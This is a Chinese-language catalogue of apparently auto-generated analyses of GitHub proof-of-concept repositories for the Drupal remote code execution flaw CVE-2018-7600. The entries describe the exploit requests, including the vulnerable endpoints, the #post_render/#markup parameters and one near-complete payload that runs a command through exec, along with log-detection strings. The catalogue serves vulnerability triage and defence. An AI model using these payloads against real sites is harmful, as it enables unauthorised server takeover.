**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Drupal

**危害等级:** 高危，允许未经身份验证的远程攻击者执行任意代码，完全控制受影响的Drupal站点。

**影响版本:** Drupal 7.x (< 7.58), 8.x (< 8.3.9), 8.4.x (< 8.4.6), and 8.5.x (< 8.5.1)

**利用条件:** 目标Drupal站点必须是受影响的版本，且没有应用相应的安全补丁。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个Drupal核心的远程代码执行漏洞。根据漏洞库信息和搜索结果，该漏洞影响多个Drupal版本，允许未经身份验证的攻击者执行任意代码。漏洞利用代码展示了使用Metasploit的drupalgeddon2模块进行攻击的流程。 

**有效性：**
提供的POC代码基于Metasploit的`drupalgeddon2`模块，该模块是公开可用的，并且被广泛用于验证和利用此漏洞。因此，POC代码的**有效性很高**，如果目标满足漏洞利用条件，则能够成功执行。

**投毒风险：**
查看提供的漏洞利用代码，该代码主要是安装和配置Drupal 7.57以及使用Metasploit模块进行渗透测试的步骤。它还包含启用 ModSecurity 作为 WAF 的操作，并测试其防御能力，然后尝试使用 Metasploit 进行攻击。最后，展示了即使有WAF存在，攻击也失败了，没有打开 Meterpreter 会话。

虽然代码的本意是演示漏洞利用与防御，但依然存在极小的投毒风险：

*   环境配置脚本中，如果作者在安装包下载链接上做了手脚，替换成了恶意版本，存在投毒的可能性。但这部分可以通过校验安装包的HASH值来规避。
*   在ModSecurity规则配置中，如果包含了恶意的排除规则，则可能降低WAF的防御能力。然而，提供的配置看起来相对标准。考虑到该项目主要关注漏洞利用演示，而并非恶意软件分发，**投毒风险较低，估计在5%左右。**

**利用方式：**
1.  攻击者识别出运行着未修补的Drupal版本的站点。
2.  攻击者构造恶意请求，通常涉及`q`参数（Drupal的路径处理机制）。
3.  恶意请求利用了Drupal的某些组件对用户输入验证不足的缺陷。
4.  恶意请求导致在服务器上执行任意PHP代码，从而实现远程代码执行。
5.  可以使用Metasploit的`drupalgeddon2`模块自动化漏洞利用过程，或者手动构造payload。

**总结：**
CVE-2018-7600是一个严重的远程代码执行漏洞，利用方式相对简单，且有公开的Metasploit模块可用。尽管代码本身演示了漏洞利用和防御，但仍需警惕潜在的投毒风险。强烈建议受影响的Drupal站点尽快升级到安全版本。

**项目地址:** [tea-celikik/Drupal-Exploit-Lab](https://github.com/tea-celikik/Drupal-Exploit-Lab)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #30

**来源**: [CVE-2018-7600-thehappydinoa_CVE-2018-7600.md](../2018/CVE-2018-7600-thehappydinoa_CVE-2018-7600.md)

## CVE-2018-7600 Drupalgeddon2 RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，允许远程攻击者执行任意代码

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点版本在受影响范围内，且存在默认或常见的模块配置。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600，又名Drupalgeddon2，是一个Drupal核心的远程代码执行漏洞。该漏洞源于Drupal在处理某些用户输入时存在缺陷，允许未经身份验证的攻击者通过构造特殊的请求来执行任意代码。

**有效性分析：**

*   漏洞库信息和搜索引擎结果均表明该漏洞是一个严重的安全问题，影响多个Drupal版本，并允许远程代码执行。
*   提供的POC代码尝试通过`drupal_ajax`接口注册用户，并利用`exec` markup执行bash命令。POC会执行`id`命令，并将结果写入一个随机名称的文件中，然后尝试通过HTTP访问该文件以验证漏洞利用是否成功。成功后，会尝试删除该文件。
*   多个Exploit-DB链接（如44448, 44449, 44482）表明存在公开可用的漏洞利用代码。

综合来看，提供的POC代码是有效的，可以用来验证目标Drupal站点是否存在CVE-2018-7600漏洞。

**投毒风险分析：**

*   POC代码本身主要功能是执行命令并将结果写入文件，之后验证文件是否可访问，以验证漏洞存在性。这种模式本身存在潜在的投毒风险，攻击者可以将恶意代码注入到被写入的文件中，或者修改POC使其执行更具破坏性的操作。
*   代码中`random_file_name`变量虽然使用了随机文件名，但如果被成功利用，攻击者可以精确控制写入内容和删除操作，因此存在恶意利用的可能性。
*   `download_command` 和 `rm_command` 如果被篡改，可能导致下载恶意文件或删除重要文件，因此也有潜在风险。
*   `tor_proxy`选项的存在意味着该POC可能被用于隐藏攻击者的真实IP地址，这增加了追踪和溯源的难度。
*   综合代码，投毒风险评估为10%。主要是因为POC的主要目的是验证漏洞，而大规模恶意利用需要在代码层面进行显著修改。

**利用方式分析：**

1.  **构造恶意请求：** 攻击者发送包含恶意代码的特殊构造的HTTP请求到Drupal站点。
2.  **利用`drupal_ajax`接口：** POC利用Drupal的`drupal_ajax`接口来触发漏洞。
3.  **远程代码执行：** 恶意代码通过Drupal的输入处理缺陷被执行，导致远程代码执行。
4.  **验证与清理（POC）：** POC验证代码执行成功后，会尝试清理现场（删除创建的文件）。实际攻击中，攻击者可能会执行更具破坏性的操作，例如安装后门、窃取数据或篡改网站内容。

**项目地址:** [thehappydinoa/CVE-2018-7600](https://github.com/thehappydinoa/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #31

**来源**: [CVE-2018-7600-vphnguyen_ANM_CVE-2018-7600.md](../2018/CVE-2018-7600-vphnguyen_ANM_CVE-2018-7600.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可导致完全控制受影响的 Drupal 站点

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点存在漏洞且可网络访问

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-7600，又名 Drupalgeddon2，是一个存在于 Drupal 多个子系统中的远程代码执行漏洞。该漏洞源于 Drupal 在处理用户提供的输入时，没有进行充分的验证，攻击者可以通过精心构造的恶意请求，在服务器上执行任意代码。 

**有效性分析：**
根据漏洞库信息和搜索结果，该漏洞是一个经过验证的远程代码执行漏洞，并且存在公开可用的利用代码。大量的安全厂商和研究人员对此漏洞进行了分析和验证，证明其有效性。 

**投毒风险分析：**
提供的Python代码是一个网络数据包捕获脚本，主要用于分析网络流量，特别是HTTP流量，并检测其中是否存在CVE-2018-7600漏洞的利用尝试。 

*   **功能：** 该脚本使用 `pyshark` 库捕获网络接口上的数据包，并分析HTTP请求的URI和POST数据。它查找包含特定关键字（如`exec`, `passthru`, `system`等）的请求，这些关键字通常与远程代码执行攻击相关。  该脚本主要用于检测已知的攻击模式，而不是发起攻击。

*   **潜在投毒风险：** 虽然该脚本本身主要是用于流量分析，但仍然存在一些潜在的风险：
    *   **性能影响：** 在高流量环境下，该脚本可能会消耗大量的CPU和内存资源，导致系统性能下降。 这种消耗如果被恶意利用，可以作为一种拒绝服务攻击。
    *   **数据泄露：** 该脚本会捕获网络数据包，其中可能包含敏感信息，例如用户名、密码、API密钥等。 如果脚本的输出被不当存储或泄露，可能会导致数据泄露。
    *   **依赖风险：** `pyshark` 依赖 `tshark`，如果 `tshark` 本身存在安全漏洞，可能会影响该脚本的安全性。
    *  **后门代码：**代码中没有明显的恶意后门代码，但捕获流量到`csv`文件中可能导致信息泄露，如果该文件可以被外部访问，或者被攻击者替换，则存在风险。

**利用方式：**
根据搜索结果和漏洞描述，攻击者可以通过以下方式利用该漏洞：

1.  发送包含恶意代码的特制HTTP请求，恶意代码通常会嵌入到URL参数或POST数据中。
2.  Drupal 的某些子系统（例如节点创建、用户注册等）在处理这些请求时，由于输入验证不足，会将恶意代码传递给PHP的 `eval()` 函数或其他类似函数执行，从而导致远程代码执行。
3.  攻击者可以利用执行的代码在服务器上安装后门、窃取数据或执行其他恶意操作。

综上，该漏洞利用的有效性很高，但提供的POC代码本身更多是流量分析工具，直接投毒风险较低(5%), 但需要注意潜在的性能影响、数据泄露和依赖风险。攻击者主要通过构造恶意 HTTP 请求来触发漏洞。

**项目地址:** [vphnguyen/ANM_CVE-2018-7600](https://github.com/vphnguyen/ANM_CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #32

**来源**: [CVE-2018-7600-xxxTectationxxx_CVE-2018-7600.md](../2018/CVE-2018-7600-xxxTectationxxx_CVE-2018-7600.md)

## CVE-2018-7600 - Drupalgeddon2 RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Drupal

**危害等级:** 高危，允许未经身份验证的攻击者执行任意代码

**影响版本:** Drupal 7.x (before 7.58), 8.x (before 8.3.9), 8.4.x (before 8.4.6), and 8.5.x (before 8.5.1)

**利用条件:** 目标Drupal站点未打补丁，并且存在默认或常见模块配置。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个存在于Drupal核心中的远程代码执行漏洞。根据漏洞信息和搜索结果，此漏洞影响多个子系统，利用方式是通过构造特殊的请求，特别是利用`user/password` endpoint，结合`#post_render`属性，触发PHP的`passthru()`函数来执行任意命令。

**有效性：**

提供的PoC代码通过两个步骤利用该漏洞：

1.  发送一个包含恶意参数的POST请求到`user/password`，利用`name[#post_render][]`，`name[#markup]`和`name[#type]`参数注入命令。
2.  从响应中提取`form_build_id`，然后发送另一个包含该`form_build_id`的请求到`file/ajax/name/#value/{form_build_id}`，以触发命令执行。

根据提供的漏洞库信息、搜索结果以及利用代码，可以判断此POC代码是**有效**的，可以利用未修复的Drupal站点执行远程代码。

**投毒风险：**

评估PoC代码是否存在投毒风险：

*   代码相对简短，易于审查。
*   代码的主要功能是利用已知的Drupal漏洞执行命令，没有发现明显的恶意行为。
*   虽然代码中没有直接发现投毒代码，但是任何代码都存在被恶意修改的风险。例如，攻击者可能会修改命令执行部分，使其在执行用户指定的命令之前或之后执行其他恶意操作。

尽管直接投毒证据不多，但考虑到软件供应链的安全风险，以及任何代码都可能被篡改的可能性，综合评估投毒风险为**5%**。这个评估考虑了代码本身的简洁性以及潜在的供应链攻击风险。

**利用方式：**

1.  攻击者首先构造一个包含恶意参数的POST请求，发送到目标Drupal站点的`user/password`路径。
2.  该请求利用了Drupal的表单渲染机制中的漏洞，允许攻击者注入并执行PHP代码。
3.  服务器响应包含一个`form_build_id`，攻击者需要提取该ID。
4.  攻击者使用提取的`form_build_id`构造第二个POST请求，发送到`file/ajax/name/#value/{form_build_id}`路径。
5.  这个请求触发Drupal执行之前注入的PHP代码，从而实现远程代码执行。

通过这种方式，攻击者可以在未经身份验证的情况下，在目标Drupal服务器上执行任意命令，从而完全控制受影响的系统。

**项目地址:** [xxxTectationxxx/CVE-2018-7600](https://github.com/xxxTectationxxx/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #33

**来源**: [CVE-2018-7600-ynsmroztas_drupalhunter.md](../2018/CVE-2018-7600-ynsmroztas_drupalhunter.md)

## CVE-2018-7600 Drupalgeddon2 RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，允许未经身份验证的攻击者执行任意代码

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点存在漏洞且网络可达

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个存在于Drupal核心中的远程代码执行漏洞。根据漏洞库信息和搜索结果，该漏洞影响多个子系统，常见模块配置也可能受到影响。大量Drupal网站受到影响。 

**有效性：**

提供的Python POC代码利用了Drupal的多个漏洞组合来实现远程代码执行。它通过构造特定的请求参数，包括`q`、`name[#post_render][]`、`name[#markup]`和`name[#type]`，以及提交`form_id`和`_triggering_element_name`来触发漏洞。然后，它解析响应以获取`form_build_id`，并使用它来发送另一个请求以执行任意命令。 搜索引擎结果中的多个条目表明该漏洞被广泛利用。

**投毒风险：**

虽然POC代码本身是为了演示漏洞利用而编写的，但存在一定的投毒风险。  如果攻击者修改了POC代码，例如，将command参数修改成下载恶意脚本并执行，那么该POC可以被用来传播恶意软件。 由于代码逻辑相对简单，作者在其中隐藏复杂后门的可能性较低。但是，无法完全排除，所以投毒风险定为10%。

**利用方式：**

1.  攻击者首先构造包含恶意参数的POST请求到目标Drupal站点的`/user/password`路径。
2.  恶意参数包括`q`设置为`user/password`，以及使用`name[#post_render][]`，`name[#markup]`和`name[#type]`来注入要执行的操作系统命令。
3.  服务器响应包含`form_build_id`。
4.  攻击者使用`form_build_id`构造另一个POST请求到`/file/ajax/name/#value/{form_build_id}`，执行先前注入的命令。
5.  命令执行的结果将返回给攻击者。

**项目地址:** [ynsmroztas/drupalhunter](https://github.com/ynsmroztas/drupalhunter)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #34

**来源**: [CVE-2018-7600-zhzyker_CVE-2018-7600-Drupal-POC-EXP.md](../2018/CVE-2018-7600-zhzyker_CVE-2018-7600-Drupal-POC-EXP.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** Drupal网站启用了默认或常见模块配置，且未打补丁

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-7600，又名Drupalgeddon 2，是一个Drupal核心的远程代码执行漏洞。该漏洞源于Drupal在处理某些用户输入时，未进行充分的验证和过滤，导致攻击者可以通过构造恶意的请求参数，在服务器上执行任意代码。

**有效性：**

根据漏洞库信息、搜索引擎结果以及提供的POC代码，可以判断该漏洞利用的有效性很高。漏洞库和搜索引擎结果均表明该漏洞是真实的，且存在公开可用的漏洞利用代码。提供的POC代码 `cve-2018-7600_cmd.py`  能够成功利用该漏洞在目标Drupal服务器上执行任意命令。

**投毒风险：**

仔细审查提供的POC代码 `cve-2018-7600_cmd.py`，初步判断投毒风险较低。代码逻辑较为清晰，主要功能是构造恶意请求，利用Drupal的漏洞执行命令。其中`/exphub.txt`是漏洞利用后留下的命令执行记录，方便查看命令执行情况。

需要注意的是，任何公开的漏洞利用代码都存在被修改和二次发布的风险，攻击者可能在其中添加恶意代码。因此，在使用任何漏洞利用代码前，都应该进行仔细审查，并确保来源可靠。但此仓库只有两个文件且内容较少,投毒风险评估为5%。

**利用方式：**

该漏洞的利用方式主要包括以下步骤：

1.  **确定目标Drupal网站版本：** 攻击者需要确定目标Drupal网站的版本是否在漏洞影响范围内。
2.  **构造恶意请求：** 攻击者需要构造包含恶意代码的请求，其中恶意代码将通过`mail[#markup]`传递给`exec`函数执行。请求的URL为`/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax`，请求方式为POST，并包含特定的payload，例如`{'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_render][]': 'exec', 'mail[#type]': 'markup', 'mail[#markup]': ''+cmd+' | tee exphub.txt'}`。
3.  **发送恶意请求：** 攻击者将构造的恶意请求发送给目标Drupal网站。
4.  **执行任意代码：** 如果目标Drupal网站存在漏洞，恶意请求中的代码将被执行，攻击者从而获得服务器的控制权。

此漏洞是一个典型的输入验证漏洞，攻击者通过精心构造的输入，绕过了Drupal的安全检查，最终导致远程代码执行。

**项目地址:** [zhzyker/CVE-2018-7600-Drupal-POC-EXP](https://github.com/zhzyker/CVE-2018-7600-Drupal-POC-EXP)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---



---

## POC #2

**来源**: [CVE-2018-7600-Damian972_drupalgeddon-2.md](../2018/CVE-2018-7600-Damian972_drupalgeddon-2.md)

## CVE-2018-7600 Drupalgeddon2

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，允许未经身份验证的远程攻击者执行任意代码

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点未打补丁，且配置允许远程访问

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个影响Drupal的远程代码执行漏洞。根据漏洞库信息、搜索引擎结果和提供的漏洞利用代码，可以得出以下结论：

**有效性：**

提供的POC代码是有效的漏洞检测脚本。它通过构造特定的URL和POST请求，利用Drupal中的输入验证漏洞，尝试执行任意命令。脚本会检测目标站点是否返回预期的“GOOD”字符串，以判断漏洞是否存在。

**投毒风险：**

该漏洞利用代码主要由一个PHP脚本组成，用于检测Drupal站点是否存在CVE-2018-7600漏洞。脚本的逻辑相对简单，主要功能是发送特定的HTTP请求并检查响应。主要的风险可能存在于以下几个方面：

1.  **命令执行：** 虽然脚本的目的是检测漏洞，但它确实会尝试在目标服务器上执行命令。如果脚本被恶意修改，攻击者可以更改`$command`变量，从而执行任意的恶意命令。
2.  **信息泄露：** 脚本会发送包含特定参数的HTTP请求，这些参数可能会泄露目标站点的信息。
3.  **拒绝服务（DoS）：** 如果脚本被大规模使用，可能会对目标服务器造成一定的负载，导致拒绝服务。

考虑到以上因素，认为此仓库中存在作者隐藏的投毒代码的可能性较低，约为5%。这个假设的依据是代码相对简单，容易审查，并且其主要目的是漏洞检测而非利用。

**利用方式：**

1.  **构造恶意请求：** 攻击者构造包含恶意代码的URL或POST请求，利用Drupal的多个子系统中的输入验证漏洞。
2.  **远程代码执行：** 恶意代码通过Drupal的渲染机制执行，导致远程代码执行。

具体来说，对于Drupal 7.x，POC利用`user/password`路径，通过`name[#post_render]`、`name[#type]`和`name[#markup]`参数注入PHP代码。对于Drupal 8.x，POC利用`user/register`路径，通过`element_parents`、`mail[a][#post_render]`、`mail[a][#type]`和`mail[a][#markup]`参数注入PHP代码。这些参数允许在特定情况下执行PHP代码，从而实现远程代码执行。

**总结：**

CVE-2018-7600是一个严重的安全漏洞，允许未经身份验证的攻击者在Drupal站点上执行任意代码。提供的POC代码可以有效地检测该漏洞，但使用时需要注意潜在的风险，以避免对目标系统造成损害。务必确保从可信来源获取利用代码，并在受控环境中进行测试。


**项目地址:** [Damian972/drupalgeddon-2](https://github.com/Damian972/drupalgeddon-2)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #3

**来源**: [CVE-2018-7600-Dowonkwon_drupal-cve-2018-7600-poc.md](../2018/CVE-2018-7600-Dowonkwon_drupal-cve-2018-7600-poc.md)

## CVE-2018-7600-Drupalgeddon 2

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** Drupal网站允许未授权用户访问用户注册页面或其他类似的form API接口

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600 (Drupalgeddon 2) 允许未经身份验证的远程攻击者在受影响的Drupal网站上执行任意代码。漏洞存在于 Drupal 的 Form API 中，通过构造特定的POST请求，可以绕过输入验证，导致代码执行。

**有效性：**
根据漏洞库信息、搜索结果和提供的POC代码，可以确认此漏洞利用是有效的。大量资料表明该漏洞已被广泛利用。

**投毒风险：**
分析提供的文件，包括`README.md`, `README.zh-cn.md`, 和 `docker-compose.yml`。这些文件主要包含漏洞描述、环境搭建说明和POC使用方法。`docker-compose.yml` 文件指定了使用 `vulhub/drupal:8.5.0` 镜像，这个镜像本身如果存在后门，可能导致投毒。此外，虽然直接的恶意代码在提供的文件中未发现，但由于攻击者能够执行任意代码，意味着他们完全有可能在目标系统上植入后门或其他恶意程序。

因此，该仓库本身直接包含投毒代码的可能性较低，但通过漏洞利用植入后门的可能性非常高，综合判断投毒风险为10%。

**利用方式：**
1.  **环境搭建：** 使用`docker-compose up -d`命令启动一个包含漏洞的Drupal环境(例如8.5.0版本)。
2.  **发送恶意请求：** 向`/user/register`或其他类似的 form API 接口发送精心构造的POST请求。该请求包含以下关键参数：
    *   `element_parents`: 用于指定表单元素路径，绕过访问控制。
    *   `ajax_form=1`: 触发 Drupal 的 AJAX 处理机制。
    *   `_wrapper_format=drupal_ajax`:  指定响应格式为 Drupal AJAX。
    *   `mail[#post_render][]`:  利用`#post_render`属性执行PHP函数（例如`exec`）。
    *   `mail[#type]=markup`:  将`mail`字段类型设置为markup，允许插入HTML代码。
    *   `mail[#markup]`:  包含要执行的命令（例如`id`）。
3.  **代码执行：** Drupal 在处理该请求时，会执行`mail[#markup]`中指定的命令，从而实现远程代码执行。

**项目地址:** [Dowonkwon/drupal-cve-2018-7600-poc](https://github.com/Dowonkwon/drupal-cve-2018-7600-poc)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #4

**来源**: [CVE-2018-7600-Hestat_drupal-check.md](../2018/CVE-2018-7600-Hestat_drupal-check.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可能导致网站被完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** Drupal网站未打补丁且存在特定模块配置（默认或常见）

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个Drupal核心中的远程代码执行漏洞。攻击者可以通过构造特定的HTTP请求，利用Drupal多个子系统中输入验证不足的问题，执行任意代码。从搜索结果可以看出，该漏洞影响广泛，有大量Drupal网站受到威胁。漏洞利用代码（提供的drupal-check.sh脚本）并非直接利用该漏洞进行攻击，而是用于**检测**Cpanel Apache和默认Apache配置中是否存在利用该漏洞的攻击痕迹，例如扫描访问日志中是否存在特定的payload特征。它主要通过搜索包含`system&name`、`q=user%2Fpassword&name%5B%23post_render%5D%5B%5D=passthru&name`和`?q=file%2Fajax%2Fname%2F%23value%2Fform-`等字符串的日志条目来判断是否存在攻击行为。该脚本会分析日志中攻击者IP以及可能被攻击的站点。由于给出的脚本是用于日志分析，主要作用是检测，不存在恶意投毒代码。

**利用方式：**

根据漏洞信息和搜索结果，CVE-2018-7600的利用方式如下：

1.  **发送恶意构造的HTTP请求：** 攻击者发送包含特定payload的POST请求，利用Drupal输入验证漏洞。
2.  **利用特定参数：** 常见的payload涉及`q=user%2Fpassword`和`name[#post_render][]`等参数，配合`passthru`或其他代码执行函数。
3.  **执行任意代码：** 成功利用漏洞后，攻击者可以在Drupal服务器上执行任意代码，从而完全控制网站。

**项目地址:** [Hestat/drupal-check](https://github.com/Hestat/drupal-check)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #5

**来源**: [CVE-2018-7600-M-Abid34_CVE-2018-7600.md](../2018/CVE-2018-7600-M-Abid34_CVE-2018-7600.md)

## CVE-2018-7600-Drupalgeddon 2

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Drupal

**危害等级:** 高危，允许未经身份验证的攻击者在服务器上执行任意代码，可能导致完全控制服务器。

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点版本在受影响范围内，且未应用安全补丁。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-7600，又名Drupalgeddon 2，是一个存在于Drupal核心中的远程代码执行漏洞。根据漏洞库信息和搜索结果，该漏洞影响多个Drupal版本。漏洞利用方式主要通过Drupal的Form API进行攻击。PoC代码通过构造恶意的HTTP请求，利用Drupal的漏洞在目标服务器上执行任意命令。具体来说，攻击者首先“毒化”表单ID，然后利用该ID执行命令。PoC代码中使用了`requests`和`BeautifulSoup`库来发送HTTP请求和解析HTML响应。代码允许指定目标URL、要执行的命令、要使用的函数（默认为`passthru`）以及代理。代码通过设置`q`参数和`name[#post_render][]`等字段来利用漏洞。尽管PoC作者声明其代码仅用于家庭实验室和教育目的，并修改自其他来源，但代码本身看起来是直接可用的漏洞利用工具。投毒风险较低，因为代码相对简单且目标明确，但始终存在作者植入恶意代码的可能性，例如，通过修改执行命令的方式或添加额外的网络请求来收集信息或执行其他恶意操作. 风险评估为5%主要是指在教育/测试环境中，如果未进行充分的安全隔离，可能导致测试环境被污染。

**项目地址:** [M-Abid34/CVE-2018-7600](https://github.com/M-Abid34/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #6

**来源**: [CVE-2018-7600-SyedGhufranRaza_CVE-2018-7600-Remote-Code-Execution.md](../2018/CVE-2018-7600-SyedGhufranRaza_CVE-2018-7600-Remote-Code-Execution.md)

## CVE-2018-7600-Drupalgeddon2-远程代码执行

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，允许未授权的远程攻击者执行任意代码，完全控制受影响的服务器，导致数据泄露、篡改、拒绝服务或植入恶意软件。

**影响版本:** Drupal 7.x < 7.58, Drupal 8.3.x < 8.3.9, Drupal 8.4.x < 8.4.6, Drupal 8.5.x < 8.5.1

**利用条件:** 目标系统运行着存在漏洞的Drupal版本，且攻击者能够通过网络访问Drupal站点。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600 (Drupalgeddon2) 是 Drupal 中的一个高危远程代码执行漏洞。该漏洞源于 Drupal Form API (FAPI) 在处理 AJAX 请求时，对数组值过滤不足，允许未经身份验证的攻击者执行任意代码。 

**有效性：**
提供的POC代码（drupalgeddon2.py）是一个Python脚本，旨在利用 CVE-2018-7600 漏洞。根据脚本描述，它包含漏洞检测、多线程和命令输出解析等功能。该脚本利用了 Drupal 的 FAPI 中存在的缺陷，通过构造恶意的 AJAX 请求来执行任意命令。多个来源（如Exploit-DB, Rapid7, NVD）确认了此漏洞的存在，并提供了利用方法。因此，该POC代码被认为是有效的。

**投毒风险：**
代码主要功能为发送恶意请求到目标Drupal服务器，并执行指定的命令。风险主要在于：

1.  **远程执行任意命令：** 脚本允许指定要执行的命令，这可能会导致攻击者在目标系统上运行恶意代码。虽然脚本本身没有包含明显的恶意代码，但是攻击者可以使用它来下载和执行其他恶意脚本。
2.  **日志记录：** 脚本可以将输出记录到文件中。恶意攻击者可能将敏感信息记录到本地日志。

总体而言，该仓库本身没有明显投毒代码,但也不能排除作者隐藏其他后门或者恶意代码的可能， 风险评估为10%。

**利用方式：**
1.  **漏洞触发：** 攻击者构造包含恶意代码的特殊请求，利用 Drupal Form API 在处理 AJAX 请求时的输入验证漏洞。
2.  **代码执行：**  Drupal 在处理该请求时，会执行攻击者注入的恶意代码。
3.  **远程控制：** 攻击者通过执行任意命令来获取服务器的控制权，窃取数据、篡改内容或进行其他恶意活动。

简单来说，攻击者通过发送特制的HTTP请求到存在漏洞的Drupal站点，即可在服务器上执行任意命令，从而实现远程代码执行。

**项目地址:** [SyedGhufranRaza/CVE-2018-7600-Remote-Code-Execution](https://github.com/SyedGhufranRaza/CVE-2018-7600-Remote-Code-Execution)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #7

**来源**: [CVE-2018-7600-a2u_CVE-2018-7600.md](../2018/CVE-2018-7600-a2u_CVE-2018-7600.md)

## CVE-2018-7600 - Drupalgeddon2 - 远程代码执行

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Drupal

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** Drupal 实例需要存在漏洞且可网络访问，无需身份验证。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600，又名 Drupalgeddon2，是一个存在于 Drupal 多个子系统中的远程代码执行漏洞。该漏洞是由于对用户提供的输入验证不足而造成的。攻击者可以通过构造特殊的请求来执行任意代码。\n\n**有效性：**
提供的 exploit.py 代码通过 `user/register` 路径利用 Drupal 的一个 AJAX 表单处理缺陷，通过修改 `element_parents` 参数来注入恶意代码。它通过设置 `mail[#post_render][]` 为 `exec`，并利用 `mail[#markup]` 来执行任意命令。代码通过检查目标服务器上是否存在 `hello.txt` 文件来验证漏洞是否利用成功。根据漏洞信息和搜索结果，这个POC 是有效的。\n\n**投毒风险：**
代码仓库主要包含漏洞利用代码、ModSecurity 规则和 .htaccess 规则，旨在利用或防御 CVE-2018-7600 漏洞。`exploit.py` 会在目标机器上写入一个名为 `hello.txt` 的文件，这是一个测试性的操作。\n
`README.md` 文件中明确表示该代码仅用于教育和信息目的，并建议用户采取防护措施，例如更新 Drupal 和设置 WAF 规则。虽然作者声明的意图是好的，但攻击者可能会修改 `exploit.py` 以执行更危险的命令，或者在其他文件中插入恶意代码。\n
`ModSecurity.txt` 和 `htaccess.txt` 文件提供了防御规则，如果使用不当，可能会导致拒绝服务或绕过某些安全策略。\n
综合考虑，该仓库存在一定的投毒风险，但主要体现在用户使用不当或攻击者修改利用代码上，作者有意投毒的可能性较低。因此，我认为投毒风险大约为 10%。\n\n**利用方式：**
